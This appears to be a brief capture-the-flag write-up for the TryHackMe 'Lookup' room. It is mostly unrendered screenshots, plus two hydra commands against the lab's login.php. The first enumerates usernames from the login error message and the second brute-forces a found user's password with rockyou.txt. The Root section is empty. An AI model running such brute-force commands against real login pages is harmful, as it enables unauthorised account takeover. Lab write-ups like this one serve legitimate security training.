![image](https://github.com/user-attachments/assets/d267a808-be76-4ef7-85e3-dd5a371e8f83)## THM_Lookup
https://tryhackme.com/room/lookup

### User
![image](https://github.com/user-attachments/assets/a1fe0497-1056-4a48-a64b-b8931de06d7e)

![image](https://github.com/user-attachments/assets/35eb0aaf-cb55-4799-92c2-842225e1f1ac)

![image](https://github.com/user-attachments/assets/24e466d7-4de6-48a4-964c-c04c67e645c2)

According to error msg I am sure "admin" is enable.And I tried to hydra for getting admin password, but there is no credential.
So I seek for other users.
```
hydra lookup.thm -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=username" -p a
```
![image](https://github.com/user-attachments/assets/058c5430-6fe8-494a-9db9-f445c9ce0074)

```
hydra lookup.thm -l jose -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password"  
```
![image](https://github.com/user-attachments/assets/1642b93d-af9b-404e-997b-b2dd62718d5d)


![image](https://github.com/user-attachments/assets/95808164-ee3d-4351-bff5-521f01d460d9)
<P>
Added /etc/hosts "files.lookup.thm"

![image](https://github.com/user-attachments/assets/0f553640-3c57-4771-8cb5-bcac492d59d4)

![image](https://github.com/user-attachments/assets/843f4bc1-59bd-49f2-9794-50cf5f6f7fac)


### Root
